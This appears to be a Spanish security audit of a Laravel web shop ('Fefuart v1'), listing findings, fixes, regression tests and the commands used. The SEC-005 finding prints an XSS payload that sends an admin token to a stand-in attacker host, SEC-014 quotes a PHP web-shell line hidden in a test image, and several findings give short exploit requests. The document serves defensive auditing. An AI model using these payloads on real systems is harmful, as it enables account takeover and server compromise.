# Auditoría de Fefuart v1

> **Fecha de la auditoría:** 2026-08-11
> **Alcance:** `master` @ `eb84d3c` — backend Laravel 12.4 (`app/Server`) y frontend HTML/JS (`app/Client`).
> **Metodología:** lectura completa del código + verificación en el entorno local con comandos de solo lectura. No se realizó explotación destructiva ni pruebas contra sistemas externos.
> **Documento vivo:** la columna *Estado* se actualiza según se van cerrando los hallazgos durante el desarrollo de v2. Ver [V2-ROADMAP.md](V2-ROADMAP.md).

---

## 1. Resumen ejecutivo

| Área | Estado en la auditoría | Hoy (2026-08-13, fin de Fase 2) |
|---|---|---|
| Seguridad | 🔴 Crítico — 5 hallazgos críticos. El rol y el precio los decide el cliente. | 🟡 12 de 14 cerrados. Queda SEC-005 (Fase 3, por construcción) y SEC-010 desarmado a la espera de sus endpoints. |
| Backend | 🟠 Deuda alta — toda la lógica en controllers. | ✅ Form Requests, Resources, Policies y Services en uso. Del código de v1 no queda nada. |
| Frontend | 🟠 Deuda alta — lógica inline en 13 HTML, XSS por `innerHTML`. | 🔴 Sin tocar. La SPA es la Fase 3; el legacy ya no funciona, y es intencionado (D15). |
| Base de datos | 🟠 Modelo incompleto — no existe catálogo. | ✅ Catálogo, variantes, envíos, línea de encargo y media. DB-006 parcial. |
| Rendimiento | 🟡 Aceptable hoy | 🟡 Índices puestos y eager loading en los endpoints nuevos. PERF-001/002 eran del frontend: Fase 4. |
| Testing | 🔴 Inexistente — 2 tests de plantilla, 0 % real. | 🟢 151 tests, con regresión explícita de cada hallazgo cerrado. |
| Entorno local | ✅ Corregido | ✅ Sin cambios. El VirtualHost definitivo sigue siendo de la Fase 8. |
| Git | 🟡 Ordenado | 🟡 `develop` con 26 commits sin subir; `autotest` intacta bajo su tag. |

**Diagnóstico de fondo.** Fefuart v1 funciona como demostración, pero su modelo de confianza está invertido: el navegador decide el rol del usuario, el precio del producto y el estado del pedido. Eso no se corrige refactorizando — hay que rediseñar la frontera cliente/servidor. Es la razón por la que v2 se construye de nuevo en lugar de endurecer v1.

---

## 2. Arquitectura de v1

```
Navegador
   |
   |-- Apache/XAMPP (DocumentRoot = C:/xampp/htdocs)
   |     └── sirve app/Client/**  Y TAMBIÉN app/Server/**  ← SEC-002
   |
   `-- fetch() con  Authorization: Bearer <JWT leído de localStorage>
          |
          v
   php artisan serve :8000  →  routes/api.php
          |
          |-- middleware IsUserAuth   (¿token válido?)
          |-- middleware IsAdmin      (¿role === 'admin'?)
          v
      Controller   ← validación + autorización + negocio + query, todo junto
          v
      Eloquent  →  MySQL `fefuart`
          v
      response()->json(<modelo Eloquent crudo>)
```

No hay capa de Service, Repository, DTO, Resource ni Policy. No hay versionado de API. `bootstrap/app.php:17-20` declara los middlewares como sentencias sin efecto (`IsUserAuth::class;`); funcionan únicamente porque las rutas los referencian por clase.

**Roles:** dos (`user`, `admin`) en una columna `varchar(20)` de `users`. Sin tabla de permisos.

---

## 3. Mapa funcional

**Entidades:** `User (1—N) Order (1—N) Product` · `User (1—N) Event`

### Flujo 1 — Encargo de producto
```
Formulario (ramo-flores | letras-infantiles | dibujo-encargo)
   ↓  el NAVEGADOR calcula el precio
cart()  →  busca o crea una Order en estado 'cart'
   ↓
PATCH /orders/{id}   fija la dirección
   ↓
POST /products       con price y order_id enviados por el cliente
   ↓
Carrito  →  «Pagar» = PATCH /orders/{id} {status: 'pending'}
```
**No hay pasarela de pago.** «Pagar» solo cambia un enum.

### Flujo 2 — Reserva de LiveArt
`live-art.html` → `POST /events` (el servidor fuerza `status: 'pending'`, correcto) → la administradora confirma o rechaza desde `admin.html`.

### Flujo 3 — Backoffice
Listar pedidos y eventos por estado, buscar pedidos por email de usuario, cambiar estados vía `PATCH /admin/orders|events/{id}`.

### Modelo de precios real
Extraído del frontend. **Todas las reglas viven en el navegador:**

| Producto | Fórmula | Variantes | Imagen | Descripción |
|---|---|---|---|---|
| Ramo de flores | 40 € × cantidad, +5 € envío físico | solo físico | obligatoria | sí |
| Letras infantiles | 40 € × cantidad, +5 € envío físico | solo físico | no | no |
| Dibujo por encargo | 30 € moda / 40 € acuarela / 20 € digital, × cantidad, +5 € físico | envío digital gratis solo si el estilo es digital | obligatoria | sí |
| Evento LiveArt | sin precio; la admin confirma o rechaza | — | — | sí |

**Incoherencia detectada:** `ramo-flores.html:112-116` aplica `× cantidad` y luego `+5`; `letras-infantiles.html:127-132` aplica `+5` y luego `× cantidad`. Dan precios distintos para el mismo caso.

`galeria.html` e `index.html` no realizan ninguna llamada a la API: la galería es estática y **no existe catálogo en ninguna parte**.

---

## 4. Hallazgos de seguridad

Severidad: **CRÍTICO** / **ALTO** / **MEDIO** / **BAJO**.
Todos confirmados por lectura de código. ✅ = además verificado ejecutando en el entorno local.

| ID | Sev. | Título | Estado |
|---|---|---|---|
| [SEC-002](#sec-002) | CRÍTICO | Apache expone todo el proyecto ✅ | ✅ **Corregido** `2fda29c` |
| [SEC-001](#sec-001) | CRÍTICO | Escalada de privilegios en el registro | ✅ **Corregido** `c4ff820`, ampliado `3e1f292` |
| [SEC-003](#sec-003) | CRÍTICO | Cualquier usuario modifica cualquier pedido | ✅ **Corregido** `2501b84` |
| [SEC-004](#sec-004) | CRÍTICO | Cualquier usuario crea y borra productos ajenos | ✅ **Corregido** `4d59836`, `d797fcb` |
| [SEC-005](#sec-005) | CRÍTICO | XSS almacenado → toma de control de la admin | ⏳ Fase 3 |
| [SEC-006](#sec-006) | ALTO | Precio y total calculados en el cliente | ✅ **Corregido** `3669964`, `d797fcb` |
| [SEC-007](#sec-007) | ALTO | Sin rate limiting en login ni registro ✅ | ✅ **Corregido** `c4ff820` |
| [SEC-008](#sec-008) | ALTO | IDOR de lectura en productos de pedido | ✅ **Corregido** `2501b84` |
| [SEC-009](#sec-009) | ALTO | IDOR de lectura en usuarios | ✅ **Corregido** `2501b84` (por ausencia) |
| [SEC-012](#sec-012) | ALTO | Excepción de login devuelta al cliente | ✅ **Corregido** `b0eac92` |
| [SEC-011](#sec-011) | MEDIO | Ciclo de vida del JWT | ✅ **Corregido** `2b67f1e` (D2) |
| [SEC-013](#sec-013) | MEDIO | CORS abierto | ✅ **Corregido** `2b67f1e` |
| [SEC-010](#sec-010) | LATENTE | Un usuario podría confirmar su propio evento | 🟡 Desarmado `0915390`; se cierra en Fase 4 |
| [SEC-014](#sec-014) | BAJO | Subida de ficheros sin re-encodificación | ✅ **Corregido** `4d59836` |

---

<a id="sec-002"></a>
### SEC-002 · CRÍTICO · Apache expone todo el proyecto ✅ CORREGIDO

**Ubicación:** `C:/xampp/apache/conf/httpd.conf` (`DocumentRoot "C:/xampp/htdocs"`, `Options Indexes`, `Listen 80`). El único `.htaccess` estaba en `app/Server/public/`.

**Problema:** el DocumentRoot es la carpeta padre del proyecto, no `app/Server/public`. Apache servía todo el árbol como ficheros estáticos.

**Verificación (curl contra localhost):** devolvían **HTTP 200**
- `app/Server/.env` — con `APP_KEY` y `JWT_SECRET` en claro
- `app/Server/storage/logs/laravel.log`
- `app/Server/database/database.sqlite`
- `app/Server/app/Http/Controllers/AuthController.php` — código PHP en texto plano
- `.git/config` — historial completo del repositorio

**Impacto:** con `JWT_SECRET` se firman tokens de administrador válidos sin necesidad de credenciales. Con `APP_KEY` se descifran cookies y payloads. Con `Listen 80`, accesible desde cualquier equipo de la red local.

**Solución aplicada** (commit `2fda29c`):
- `.htaccess` raíz — desactiva el listado de directorios, deniega ficheros ocultos y bloquea `.git` por reescritura.
- `app/Server/.htaccess` — `Require all denied` sobre todo el backend.
- `app/Server/public/.htaccess` — `Require all granted` explícito en el único directorio público.
- **`APP_KEY` y `JWT_SECRET` rotados** el 2026-08-11 (se consideran comprometidos). Copia del `.env` previo fuera del repositorio.

**Verificado tras la corrección:** todos los recursos anteriores devuelven **403**; el frontend legacy sigue devolviendo 200.

**Pendiente para la fase de despliegue:** en producción el DocumentRoot debe apuntar directamente a `app/Server/public` mediante VirtualHost. El `.htaccess` es contención, no la arquitectura definitiva.

---

<a id="sec-001"></a>
### SEC-001 · CRÍTICO · Escalada de privilegios en el registro

**Ubicación:** `app/Server/app/Http/Controllers/AuthController.php:29` · `app/Server/app/Models/User.php:24`

```php
'role' => $request->get('role', 'user'),   // AuthController.php:29
```

**Problema:** `role` se toma del cuerpo de la petición y no figura en el validador. Además está en `$fillable`.

**Explotación:** `POST /api/register` con `{"name":"x","email":"…","password":"…","password_confirmation":"…","role":"admin"}`. Endpoint público, sin autenticación previa.

**Impacto:** control total del backoffice — lectura de los datos personales de todos los clientes, borrado de pedidos y eventos.

**Solución:** fijar `'role' => 'user'` en servidor, sacar `role` de `$fillable` y promover administradores solo por comando o seeder.

---

<a id="sec-003"></a>
### SEC-003 · CRÍTICO · Cualquier usuario modifica cualquier pedido

**Ubicación:** `OrderController.php:220-245` — la comprobación de autorización está **comentada** (líneas 223-227) · `routes/api.php:44`

**Problema:** `PATCH /api/orders/{id}` está bajo `IsUserAuth` y no comprueba ni propiedad ni rol.

**Explotación:** `PATCH /api/orders/7 {"status":"paid"}` desde cualquier cuenta autenticada. También son modificables `total` y `address`.

**Impacto:** fraude (marcarse pedidos como pagados), sabotaje y alteración de datos de envío ajenos.

**Solución aplicada** (commit `2501b84`): existe `OrderPolicy` y **no queda ningún endpoint que acepte un estado o un total en el cuerpo**. El `PATCH /orders/{id}` se sustituye por `POST /orders/{id}/cancel`, y las transiciones válidas las declara `OrderStatus`. Un test recorre la tabla de rutas y comprueba que el `PATCH` ya no existe; otro comprueba que cancelar el pedido de otro responde 403.

N12 se refleja en la Policy: el cliente cancela solo antes de pagar; después lo hace la administradora.

---

<a id="sec-004"></a>
### SEC-004 · CRÍTICO · Cualquier usuario crea y borra productos ajenos

**Ubicación:** `routes/api.php:27-28` — `POST /products` y `DELETE /products/{id}` bajo `IsUserAuth` · `ProductController.php:16,128`

**Nota histórica:** `routes/api.php:57` conserva comentada la versión admin del `DELETE`. El commit `eb84d3c` («bugfix/User no puede eliminar productos») resolvió el síntoma moviendo el borrado al lado inseguro.

**Explotación:** `DELETE /api/products/42` borra el producto de otro usuario y su imagen del disco. `POST /products` con un `order_id` ajeno inyecta líneas en el pedido de otro.

**Solución aplicada** (commits `4d59836`, `d797fcb`): la línea de pedido se autoriza a través de su pedido con `OrderPolicy@updateCart`, y el fichero por `MediaAssetPolicy`. Además, adjuntar una `reference_media_id` ajena responde 403 — era la vía equivalente a inyectar un `order_id` ajeno. Hay test de las tres cosas.

---

<a id="sec-005"></a>
### SEC-005 · CRÍTICO · XSS almacenado → toma de control de la cuenta admin

**Ubicación:** `app/Client/js/admin.js:95-103, 177-188, 279-288` · `app/Client/views/cart.html:62-74` · `app/Client/js/order.js:90-93`

**Problema:** campos controlados por el usuario (`event.title`, `event.description`, `event.location`, `product.name`, `product.description`, `order.address`, `user.name`, `user.email`) se insertan con `innerHTML` sin escapar.

**Explotación:** un usuario sin privilegios crea un evento cuyo título es
`<img src=x onerror="fetch('//atacante/?t='+localStorage.token)">`.
Cuando la administradora abre el panel, el script se ejecuta en su sesión.

**Impacto:** el JWT se guarda en `localStorage` (`auth.js:8-9`), de modo que el payload lo roba directamente. **Cadena completa: usuario sin privilegios → administrador.**

**Solución:** en v2, React escapa por defecto; se prohíbe `dangerouslySetInnerHTML` por regla de ESLint. La decisión D2 (cookies HttpOnly) elimina además el token del alcance de JavaScript, cortando la cadena en su segundo eslabón. Añadir CSP.

---

<a id="sec-006"></a>
### SEC-006 · ALTO · Precio y total calculados en el cliente

**Ubicación:** `app/Client/views/ramo-flores.html:112-118,149` y equivalentes en `letras-infantiles.html` y `dibujo-encargo.html` · `ProductController.php:21` (`'price' => 'required|numeric'`) · `app/Client/js/order.js:124-134`

**Problema:** el navegador decide `price` y `total`; el servidor acepta cualquier número.

**Explotación:** interceptar el `POST /api/products` y enviar `price=0.01`. O directamente `PATCH /orders/{id} {"total":0}`.

**Impacto:** pedidos a precio arbitrario. Es la razón de fondo por la que v2 necesita un catálogo en servidor, y bloquea la integración de pagos reales.

**Solución aplicada** (commits `3669964`, `d797fcb`): el catálogo vive en `products` + `product_variants` y `PricingService` es el único sitio donde se decide un precio. `StoreCartItemRequest` **no tiene ningún campo de precio**: el cuerpo dice qué se encarga, no cuánto cuesta.

La regresión manda `price`, `unit_price`, `line_total`, `total` y `shipping_total` envenenados y comprueba que el pedido sale al precio del catálogo. Verificado además a mano contra `php artisan serve`: el cliente envía `price=0.01` y `total=0.00`, el servidor cobra 55,00 €.

El cálculo va en céntimos enteros. Con floats, `0.1 + 0.2` no es `0.3`, y en un pedido de varias líneas ese error acaba descuadrando el cobro.

---

<a id="sec-007"></a>
### SEC-007 · ALTO · Sin rate limiting en login ni registro ✅ *verificado*

**Ubicación:** `routes/api.php:13-14` · `AppServiceProvider` no define limitadores.

**Verificación:** `php artisan route:list --json` muestra el middleware `["api", …]` **sin `throttle`** en ninguna ruta.

**Impacto:** fuerza bruta contra credenciales, enumeración de usuarios (el registro delata qué emails existen mediante `unique:users`) y alta masiva de cuentas.

**Solución:** `throttle` por IP + email en login; throttle estricto o captcha en registro.

---

<a id="sec-008"></a>
### SEC-008 · ALTO · IDOR de lectura en productos de pedido ✅ CORREGIDO

**Ubicación:** `ProductController.php:58-71` — `getProductsByOrderId` no comprueba la propiedad.

**Explotación:** `GET /api/products/1..N` enumera las líneas de todos los pedidos del sistema.

**Solución aplicada** (commit `2501b84`): las líneas ya no son un recurso de primer nivel — se leen dentro de su pedido, y `GET /api/orders/{id}` pasa por `OrderPolicy@view`. Un pedido ajeno responde 403.

---

<a id="sec-009"></a>
### SEC-009 · ALTO · IDOR de lectura en usuarios ✅ CORREGIDO

**Ubicación:** `AuthController.php:82-91` · `routes/api.php:21` (bajo `IsUserAuth`, no `IsAdmin`)

**Explotación:** `GET /api/user/1..N` devuelve el modelo `User` completo (nombre, email, rol, fechas) de cualquier usuario. `password` sí está en `$hidden`.

**Impacto:** fuga de datos personales de clientes. Relevante a efectos de RGPD.

**Solución aplicada** (commit `2501b84`): **por ausencia.** En v2 no existe ninguna ruta que devuelva otro usuario por id; el perfil solo devuelve la cuenta propia. El test recorre la tabla de rutas y comprueba que no aparece ninguna, de modo que reintroducirla rompe la suite.

---

<a id="sec-012"></a>
### SEC-012 · ALTO · Excepción de login devuelta al cliente ✅ CORREGIDO

**Ubicación:** `AuthController.php:70` · `.env` (`APP_DEBUG=true`)

```php
return response()->json(['error' => 'Could not create token', $e], 500);
```

**Problema:** el objeto excepción completo se serializaba en la respuesta JSON — traza, rutas del sistema y configuración — **con independencia de `APP_DEBUG`**.

**Solución aplicada** (commit `b0eac92`): el detalle va al log mediante `report($e)` y el cliente recibe solo el motivo. `.env.example` pasa a `APP_DEBUG=false` para que la plantilla sea segura por defecto.

**Decisión consciente:** `APP_DEBUG` se mantiene a `true` en el `.env` local. Cerrado SEC-002 y con `php artisan serve` escuchando solo en `127.0.0.1`, las trazas no salen de la máquina, y desactivarlas degradaría el desarrollo sin ganancia de seguridad real. Debe ser `false` en cualquier entorno desplegado.

---

<a id="sec-011"></a>
### SEC-011 · MEDIO · Ciclo de vida del JWT

**Ubicación:** `config/jwt.php` (`ttl` 60 min, `refresh_ttl` 14 días, blacklist activa) · `app/Client/js/auth.js:7-10` (`localStorage`)

**Problema:** no existe endpoint de refresh ni rotación; el logout invalida únicamente el token presentado; el almacenamiento es accesible desde JavaScript.

**Impacto:** combinado con SEC-005, el robo del token es total y no revocable por sesión o dispositivo.

**Solución:** lo resuelve de raíz la decisión **D2** — Sanctum con cookies HttpOnly.

---

<a id="sec-013"></a>
### SEC-013 · MEDIO · CORS abierto

**Ubicación:** no existe `config/cors.php`; se aplica el default del framework (`vendor/laravel/framework/config/cors.php`): `allowed_origins: ['*']` sobre `api/*`.

**Matiz:** con el token en cabecera `Authorization` y `supports_credentials: false`, esto **no** es explotable como CSRF en el estado actual. Es un fallo de endurecimiento, no una vía de ataque directa.

**Atención:** al pasar a cookies HttpOnly (D2), un CORS permisivo **sí** sería crítico. Debe configurarse con orígenes explícitos en la Fase 1.

---

<a id="sec-010"></a>
### SEC-010 · LATENTE · Un usuario podría confirmar su propio evento

**Ubicación:** `EventController.php:189-210`

```php
$event->update($request->only(['title','description','date','location','status']));
```

**Problema:** `status` es actualizable por el propietario del evento, sin restricción por rol ni validación de valores permitidos. Un cliente podría pasar su evento de `pending` a `confirmed`.

**Por qué es latente y no activo:** la única ruta de usuario que llega aquí es `PATCH /api/events/{id}` → `EventController@updateEvent`, y ese método **no existe** (ver BUG-002), por lo que la petición falla antes. **Se activaría en el momento en que se arregle esa ruta.**

**Desarmado** (commit `0915390`): `status` sale de `$fillable`, así que el `$event->update($request->only([… 'status']))` de v1 ya no puede confirmar nada, y `EventPolicy` separa `quote` y `confirm` como abilities solo de la administradora. **Queda abierto** porque los endpoints de eventos son de la Fase 4 (D27): hasta que existan, la regresión es un test de Policy y no un IDOR sobre HTTP. Se cierra allí.

---

<a id="sec-014"></a>
### SEC-014 · BAJO · Subida de ficheros ✅ CORREGIDO

**Ubicación:** `ProductController.php:27,37-39`

**Estado:** razonablemente correcto — valida `image|mimes:jpeg,png,jpg,gif|max:2048` y el nombre lo genera Laravel. Falta re-encodificación y límite de dimensiones. Riesgo bajo; mejorable en v2.

**Solución aplicada** (commit `4d59836`): `MediaStorageService` decodifica los píxeles y escribe una imagen nueva desde cero, así que EXIF, comentarios y payloads pegados se quedan fuera. El test construye un JPEG válido con `<?php system($_GET[0]); ?>` pegado detrás —que pasa entera la validación de v1— y comprueba que el fichero guardado ya no lo contiene y sigue siendo un JPEG legible. El lado mayor se limita a 2400 px: v1 acotaba el peso pero no las dimensiones, y un JPEG muy comprimido de 12000×12000 pesa poco y agota la memoria al abrirlo.

**Hallazgo nuevo, encontrado al escribir el test:** `mimes:` se fía de lo que declara el cliente. Un fichero que la pasa pero que GD no sabe decodificar producía un **500 con traza** en vez de un 422. Se añade la regla `DecodableImage`, que mira los bytes.

---

### Revisado y no encontrado

- **SQL injection** — todo el acceso a datos es vía Eloquent; no hay `DB::raw` con entrada del usuario.
- **Command injection**, **SSRF**, **path traversal**, **open redirect** — sin superficie.
- **Secretos en el repositorio** — `.env` **no** está versionado; solo `.env.example`.

### Pendiente de verificación

- `composer audit` y `npm audit` no ejecutados (requieren acceso a red). **Laravel 12.4.0** va por detrás de la línea 12.x actual: comprobar advisories antes de fijar versiones en v2.

---

## 5. Errores funcionales

| ID | Ubicación | Problema | Estado |
|---|---|---|---|
| BUG-001 | `routes/api.php:25` | `ProductController@getProducts` **no existe** → `GET /api/products` responde 500 a cualquier usuario autenticado. | ✅ `d47cf29` — lo sustituye `GET /api/catalog/products` |
| BUG-002 | `routes/api.php:35` | `EventController@updateEvent` **no existe** → `PATCH /api/events/{id}` responde 500. Consecuencia: el usuario no puede editar su propio evento. | ⏳ Fase 4 — `EventPolicy@update` ya lo permite; falta el endpoint |
| BUG-003 | `routes/api.php:40` | `GET /user-orders` apunta a `getOrdersByUserId($id)` pero la ruta no define `{id}` → 500. | ✅ `2501b84` — `GET /api/orders` sale de la sesión, no de la URL |
| BUG-004 | `OrderController.php:59` | `$user->role !== $order->user_id` compara un rol con un id. Un usuario normal **nunca** puede ver su propio pedido: siempre 403. | ✅ `2501b84` — con test de que el cliente sí ve su pedido |
| BUG-005 | `views/cart.html:76-79` | `patchOrder()` se llama dentro del `forEach` → N peticiones PATCH, cada una con un total parcial. | ✅ `d797fcb` — cada respuesta trae el pedido entero recalculado |
| BUG-006 | `ProductController.php:110-122` | Valida 9 campos y persiste solo 3 (`name`, `price`, `delivery_type`). El resto se descarta en silencio. | ✅ `d03f156` — Form Request + `update($request->validated())` |
| BUG-007 | `ProductController.php:91,133` | `response()->json(['message'=>'…', 404])` — el 404 va como elemento del array, así que el HTTP status real es **200**. | ✅ `d47cf29` — con test de que un slug inexistente da 404 de verdad |
| BUG-008 | varios | Una colección vacía devuelve 404 (`getUserOrders`, `getEvents`, `getConfirmedEvents`…). Semánticamente debe ser 200 con lista vacía. | ✅ `d47cf29` — con test de catálogo vacío |

---

## 6. Backend — deuda técnica

| ID | Sev. | Problema |
|---|---|---|
| ARCH-001 | Alto | ✅ **Corregido.** Form Requests, API Resources, Policies y Services existen y están en uso. Validación, autorización, negocio y query están separados. |
| ARCH-002 | Medio | ✅ **Corregido `2b67f1e`.** `bootstrap/app.php` registra los middlewares de verdad y la comprobación de rol vive solo en `EnsureIsAdmin`. |
| ARCH-003 | Medio | ✅ **Corregido.** Sustantivos en plural, sub-recursos para las transiciones de estado y sin prefijo de versión (D13). |
| ARCH-004 | Bajo | ✅ **Corregido `3e14d0a`.** Se retira `personal_access_tokens`: el modo cookie de Sanctum no emite tokens personales. |
| ARCH-005 | Medio | ✅ **Corregido.** Todas las respuestas van por API Resource; ningún modelo Eloquent crudo sale de un controller. |

---

## 7. Base de datos (MySQL `fefuart`)

| ID | Sev. | Problema |
|---|---|---|
| DB-001 | Alto | ✅ **Corregido 2026-08-11.** *Deriva de esquema:* había 9 migraciones aplicadas en MySQL frente a 7 ficheros en el repositorio — `media_assets` y `operational_notifications` existían en la base de datos pero sus migraciones solo estaban en la rama `autotest`, dejando `migrate:status` engañoso y `migrate:rollback` roto. Ambas tablas estaban vacías y ninguna clave foránea apuntaba hacia ellas: se eliminaron junto con sus dos filas de `migrations`. Backup previo del esquema completo fuera del repositorio. Estado actual: 7 migraciones = 7 ficheros, ninguna pendiente, datos de v1 intactos. |
| DB-002 | Alto | ✅ **Corregido `4ac9ae3`.** **No existía catálogo.** `products.order_id` hacía que la tabla `products` fuese en realidad la de líneas de pedido. *Matiz:* que cada línea sea única y lleve su propia imagen y descripción es correcto y necesario — un dibujo por encargo es distinto de otro. El problema era que **ninguna tabla definía qué se puede encargar ni a qué precio**, y por eso el precio solo podía venir del navegador (SEC-006). Ahora `products` describe el tipo de encargo, el precio vive en `product_variants` y el encargo concreto en `order_items`. Un test comprueba que `products` no tiene ni `price` ni `order_id`. |
| DB-003 | Medio | ✅ **Corregido `4ac9ae3`, `3e14d0a`, `0915390`.** Índices `products(is_active, category)`, `orders(user_id, status)`, `orders(status, placed_at)` y `events(status, event_date)`, con test que los verifica sobre el esquema real. |
| DB-004 | Medio | ✅ **Corregido `3e14d0a`, `4ac9ae3`, `0915390`.** softDeletes en `orders`, `products`, `product_variants` y `events`. Un producto retirado desaparece del catálogo público y el pedido que lo compró conserva su nombre en el snapshot; hay test. |
| DB-005 | Bajo | ✅ **Corregido `3e14d0a`.** `order_date` pasa a `placed_at` (timestamp, nulo mientras es carrito) y la dirección se desglosa en campos. |
| DB-006 | Bajo | 🟡 **Parcial `d797fcb`.** `CartService` garantiza un solo carrito por usuario en aplicación, con test. La garantía en base de datos necesita el mismo índice sobre columna generada que N16 y va con él en la Fase 5. |
| DB-008 | Info | **No hay datos reales.** 2 usuarios (`journey-user@example.com`, `admin@local.test`), 12 pedidos idénticos (45,00 €, `pending`) y 18 productos: todo son fixtures de los E2E de la rama `autotest`. |

---

## 8. Rendimiento

Medido donde se indica; el resto es análisis estático.

| ID | Problema |
|---|---|
| PERF-001 | N+1 real en `admin.js:92,276`: una petición `GET /user/{id}` por cada fila renderizada. |
| PERF-002 | N peticiones `PATCH` por cada render del carrito (consecuencia de BUG-005). |
| PERF-003 | Los listados del backoffice hacen full scan por falta de índices (DB-003). |
| PERF-004 | Los endpoints de eventos devuelven todas las filas sin paginar, con `user` eager-loaded. |

> **Hipótesis, no medido:** con el volumen actual (decenas de filas) nada de esto resulta perceptible. Son problemas de diseño a corregir en v2, no incidencias en curso. **No se ha ejecutado profiling ni `EXPLAIN`.**

---

## 9. Testing

`tests/Feature/ExampleTest.php` y `tests/Unit/ExampleTest.php`, ambos de plantilla. **Cobertura real: 0 %.**

No hay tests de frontend ni E2E. Nada cubre autenticación, autorización, cálculo de precios ni transiciones de estado — que es exactamente donde se concentran los cinco hallazgos críticos.

**Estado al cerrar la Fase 2:** 151 tests. Los dos de plantilla se retiraron en `7d9e795`. Cada hallazgo cerrado tiene su regresión, y varias están escritas para que reintroducir el fallo rompa la suite aunque nadie recuerde por qué: el test de SEC-009 recorre la tabla de rutas buscando un endpoint que devuelva otro usuario, y el de SEC-003 busca un `PATCH` sobre un pedido.

Sigue sin haber tests de frontend ni E2E: van con la SPA, en las Fases 3 y 7.

---

## 10. Dependencias

`composer.json` es coherente con Laravel 12 (PHP ^8.2, `tymon/jwt-auth` ^2.2, Pest 3).

- `laravel/sanctum` es peso muerto en v1 (pasa a ser el núcleo de autenticación en v2, decisión D2).
- El `package.json` de `app/Server` incluye Vite, Tailwind y Axios que **no se usan**: el frontend legacy no tiene proceso de build.
- Auditoría de vulnerabilidades de paquetes: **pendiente**.

---

## 11. La rama `autotest`

```
master  eb84d3c
   └── autotest  8ba920d   (+4 commits, +16.325 líneas, 195 ficheros)
```

Una sesión autónoma anterior construyó en esa rama un intento de v2 bastante avanzado: backend modular con DDD (7 módulos), SPA React/TypeScript, 12 ficheros de tests, 7 specs de Playwright, CI de GitHub Actions (567 líneas) y un contrato de API de 751 líneas. El reflog muestra que `master` fue **reseteado** para descartarlo.

Sus migraciones `media_assets` y `operational_notifications` son las que permanecen aplicadas en la base de datos local (DB-001).

**Decisión D1: descartada.** v2 se construye desde cero. La rama se conserva intacta y además está etiquetada como `archive/v2-autonomous-attempt` para que el trabajo no se pierda si algún día se borra.

---

## 12. Cómo se reprodujo esta auditoría

Todos los comandos empleados fueron de solo lectura:

```bash
# Git
git branch -a && git log --oneline && git reflog
git diff --stat master autotest && git show autotest:<doc>

# Rutas y middlewares reales
cd app/Server && php artisan route:list --json
php artisan migrate:status

# Base de datos
mysql -u root fefuart -e "SELECT table_name, table_rows FROM information_schema.tables WHERE table_schema='fefuart'"
mysql -u root fefuart -e "SHOW CREATE TABLE media_assets"

# Exposición web (SEC-002)
curl -s -o /dev/null -w '%{http_code}' http://localhost/Fefuart/app/Server/.env
```

Además se leyeron por completo los 5 controllers, los 2 middlewares, los 4 modelos, las 7 migraciones, `bootstrap/app.php`, `config/{jwt,auth,session,filesystems}.php`, el `.env` (sin reproducir secretos), los 5 módulos JavaScript y los 13 ficheros HTML.
